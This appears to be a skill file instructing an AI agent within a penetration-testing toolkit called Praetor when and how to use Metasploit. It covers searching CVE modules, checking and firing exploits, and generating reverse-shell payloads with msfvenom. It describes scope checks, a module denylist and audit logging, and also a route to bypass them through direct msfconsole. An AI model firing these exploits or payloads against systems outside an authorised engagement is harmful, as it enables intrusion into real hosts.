# msf-quickwin — Metasploit Framework exploit-on-demand

Load when an attack vector has been identified that **matches a known CVE / fingerprinted vuln / scanner-detected service**. Operator quick-win pattern: hundreds of audited MSF modules cover well-known classes — using them is faster + more reliable than Claude regenerating payloads from scratch.

## When to reach for MSF instead of crafting custom

| Signal | Reach for MSF? |
|---|---|
| `lookup_cve(tech_stack)` returned hits | YES — `msf_search(query='CVE-YYYY-NNNN')` |
| `detect_tech_stack` matched a fingerprint with known RCE | YES — try MSF module first |
| `run_nuclei` flagged a templated vuln | MAYBE — MSF often has the exploit; nuclei was detection |
| Modern attack class (RSC Flight, OAuth chains, GraphQL drift, CSPP/SSPP, MCP tool poisoning) | NO — Praetor KB + custom flow; MSF lags here |
| Custom multi-step business-logic flaw | NO — `run_flow` / `run_pyexploit` |
| Authenticated IDOR / BFLA | NO — `test_auth_matrix` |
| Auth flow attacks (state CSRF, PKCE, nonce binding, DPoP htu) | NO — `oauth_flow_simulator` / `oauth_dpop_audit` |

## Workflow

1. **Identify CVE / fingerprint.** Examples: log4shell, Spring4Shell, Struts2 OGNL, Confluence pre-auth RCE, CouchDB, Atlassian, JetBrains TeamCity, Ivanti, MOVEit.
2. **Search.** `msf_search(query='log4shell')` or `msf_search(query='CVE-2024-XXXXX')`. Returns module names + ranks + disclosure dates + whether each has a `check` action.
3. **Read.** `msf_module_info(module='exploit/multi/http/log4shell_header_injection')` to see required options + target list + references.
4. **Verify non-destructively.** `msf_check(module, options={'RHOSTS':'<target>'})` runs the module's `check` action. Returns VULNERABLE / NOT_VULNERABLE / DETECTED / UNKNOWN. ALWAYS run this first.
5. **Fire (gated).** `msf_exploit(module, options, require_check_first=True)` fires the module IFF check returned VULNERABLE. Otherwise refuses to fire. Set `require_check_first=False` only when the module has no check action (rare; module_info will say).
6. **Save evidence.** Successful exploit returns `session_opened:true` + raw msfconsole output. Save via `save_finding(...)` with `evidence` linking the MSF run + `.burp-intel/_audit.log` entry. Severity per real impact (CRITICAL for confirmed RCE with shell).

## Safety enforced at tool layer

- **Rule 5** — module-name denylist. DoS / persistence / wiper / miner / backdoor modules refused at the tool layer. Drop to direct `msfconsole` if RoE permits and own the target-state impact.
- **Rule 1** — RHOSTS / RHOST options scope-checked via Burp extension before fire. Out-of-scope targets logged to `.burp-intel/_audit.log` (operator-mode) or refused (strict-mode).
- **Rule 26a exception** — MSF traffic does NOT route through Burp (Burp speaks HTTP, MSF speaks raw exploit protocols). Each fire appends `transport:"msf-direct"` + `operator_authorized:true` to the audit log.

## Payload generation

`msf_payload_gen(payload='linux/x64/shell_reverse_tcp', options={'LHOST':...,'LPORT':...}, format='python')` wraps msfvenom. Useful when:
- You need a payload artefact for a non-MSF exploit chain
- You need an encoded shellcode for evidence
- You need a stub to embed in custom PoC

Destructive payload names (`*wipe*`, `*destroy*`, `*format*`) refused.

## Sequencing with the rest of Praetor

```
detect_tech_stack(index)
  └─ lookup_cve(tech_stack) | search_cve(query) | map_tech_to_cves
       └─ if CVE-matched MSF module:
            msf_search(query='CVE-YYYY-NNNN')
            └─ msf_module_info(module)
                 └─ msf_check(module, options={RHOSTS:...})
                      └─ if VULNERABLE: msf_exploit(module, options, require_check_first=True)
                           └─ save_finding(severity='CRITICAL', evidence={msf_audit_id, session_opened})
       └─ else (no MSF module / modern class):
            auto_probe / test_<vuln_class> / run_pyexploit (custom)
```

## What MSF will NOT solve

- Authentication / authorization flaws — they need session state Praetor manages
- Modern web-app classes (RSC, GraphQL, OAuth flows) — Praetor's KB + oauth_flow_simulator + W22 tools
- Business-logic vulnerabilities — these are target-specific
- Information disclosure / IDOR — `test_auth_matrix` + `compare_auth_states`

Use MSF for **network-service-level CVE-tagged exploits**. Use Praetor's native tooling for **application-logic** + **modern web-class** + **authenticated flows**.
